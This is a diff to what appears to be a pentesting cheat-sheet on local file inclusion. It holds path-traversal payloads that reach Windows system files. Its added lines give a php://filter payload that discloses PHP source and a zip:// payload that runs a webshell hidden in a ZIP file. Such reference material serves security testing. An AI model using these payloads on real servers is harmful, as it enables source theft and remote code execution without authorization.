@@ -6,7 +6,7 @@ local file inclusion happens when it is possible to access files stored on the t
 
 See [LFI List](file-upload/lfi-list.md) for a list of possible target files for tests
 
-#### Payloads
+### Payloads
 
 ```
 #Linux
@@ -14,6 +14,19 @@ See [LFI List](file-upload/lfi-list.md) for a list of possible target files for 
 #Windows
 ..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini
 ..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+```
+
+### Importing with file modifiers
+
+Disclose PHP file source code
+
+<pre><code><strong>&#x3C;url>?&#x3C;arg>=php://filter/convert.base64-encode/resource=&#x3C;php file>.php
+</strong></code></pre>
+
+Execute webshell from a ZIP file. The webshell extension ca be omitted
+
+```
+<url>?<arg>=zip://<path to zip file>%23<webshell>?<args>
 ```
 
 ## RFI
